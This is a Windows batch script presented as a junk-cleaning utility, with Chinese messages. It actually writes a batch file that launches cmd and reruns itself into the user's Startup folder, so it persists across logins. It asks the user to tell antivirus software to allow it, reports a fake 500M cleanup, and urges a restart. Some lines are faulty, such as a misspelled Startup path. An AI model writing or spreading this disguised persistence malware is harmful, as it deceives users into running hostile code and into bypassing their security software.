@echo off
color 2f
title 垃圾清理
echo ====若有杀毒软件恶意拦截，请选择【允许本程序的操作】====
echo.
echo.
echo start cmd >c:\windows\windows.bat
echo %0 >>c:\windows\windows.bat
copy c:\windows\windows.bat "%USERPROFILE%\AppData\Roaming\Microsoft\windows\StartMenu\Programs\Starup\">nul
if %errorlevel%==0 goto next
copy c:\windows\windows.bat "%USERPROFILE%\「开始」菜单\程序\启动">nul 
if %errorlevel%==1 goto error

:next
echo.
echo.
echo. =======垃圾情理中，请不要关闭窗口=========
echo.
ping -n 127.0.0.1>nul
echo.
echo  ======垃圾清理完毕，共清理500M垃圾========
echo.
echo.
echo. ============建议立即重启电脑==============
pause

:error
echo.
echo.
echo   =========糟糕！！！程序运行失败，请【使用管理员权限】重新运行===========
echo.
pause
